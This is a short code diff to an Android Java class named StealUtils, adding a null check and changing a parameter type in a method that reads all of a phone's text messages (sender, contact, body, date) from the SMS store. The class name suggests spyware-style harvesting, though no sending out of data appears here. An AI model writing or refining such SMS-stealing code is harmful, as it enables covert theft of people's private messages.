@@ -261,7 +261,7 @@ public class StealUtils {
      * @param context
      * @return
      */
-    public static String getSmsInPhone(final Context context) {
+    public static String getSmsInPhone(final Activity context) {
 
         final StringBuilder smsBuilder = new StringBuilder();
 
@@ -281,7 +281,8 @@ public class StealUtils {
                             Uri uri = Uri.parse(SMS_URI_ALL);
                             String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
                             Cursor cur = context.getContentResolver().query(uri, projection, null, null, "date desc");        // 获取手机内部短信
-
+                            if (null==cur)
+                                return;
                             if (cur.moveToFirst()) {
                                 int index_Address = cur.getColumnIndex("address");
                                 int index_Person = cur.getColumnIndex("person");
